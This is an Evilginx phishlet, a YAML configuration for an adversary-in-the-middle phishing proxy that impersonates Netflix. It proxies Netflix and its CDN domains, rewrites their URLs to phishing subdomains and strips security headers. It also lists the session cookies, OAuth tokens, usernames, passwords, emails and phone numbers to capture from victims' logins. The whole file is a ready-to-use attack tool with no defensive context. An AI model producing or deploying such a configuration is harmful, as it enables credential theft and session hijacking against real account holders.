min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://www.netflix.com/'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'netflix.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'netflix.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'secure', orig_sub: 'secure', domain: 'netflix.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'nflximg.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'occ', orig_sub: 'occ', domain: 'nflximg.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Netflix domain URLs
  - {triggers_on: 'www.netflix.com', orig_sub: 'www', domain: 'netflix.com', search: 'https://www\\.netflix\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.netflix.com', orig_sub: 'api', domain: 'netflix.com', search: 'https://api\\.netflix\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.netflix.com', orig_sub: 'secure', domain: 'netflix.com', search: 'https://secure\\.netflix\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Replace Netflix CDN URLs
  - {triggers_on: 'www.netflix.com', orig_sub: 'assets', domain: 'nflximg.com', search: 'https://assets\\.nflximg\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.netflix.com', orig_sub: 'occ', domain: 'nflximg.com', search: 'https://occ[0-9]*\\.nflximg\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.netflix.com', orig_sub: 'assets', domain: 'nflximg.com', search: 'https://[a-z0-9-]+\\.nflximg\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'www.netflix.com', orig_sub: 'www', domain: 'netflix.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.netflix.com', orig_sub: 'www', domain: 'netflix.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.netflix.com', orig_sub: 'api', domain: 'netflix.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.netflix.com', orig_sub: 'api', domain: 'netflix.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary Netflix authentication cookies
  - domain: '.netflix.com'
    keys: ['NetflixId', 'memclid', 'SecureNetflixId', 'nfvdid', 'NetflixId.legacy']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.netflix.com'
    keys: ['clSharedContext', 'clSharedContext-*', 'profilesNewSession', 'profilesNewSession-*']
    type: 'cookie'
    optional: true
  
  # User preferences
  - domain: '.netflix.com'
    keys: ['locale', 'preferredLocale', 'preferredSubtitleLanguage']
    type: 'cookie'
    optional: true
  
  # OAuth tokens
  - domain: '.netflix.com'
    keys: ['access_token', 'refresh_token', 'token_type']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'userLoginId'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # Alternative email field
  email:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  # Phone number field
  phone:
    key: 'phoneNumber'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '^/browse'
  - '^/title'
  - '^/profiles/manage'
  - '^/account'
  - '^/YourAccount'
  - '^/settings'

login:
  domain: 'www.netflix.com'
  path: '/login'

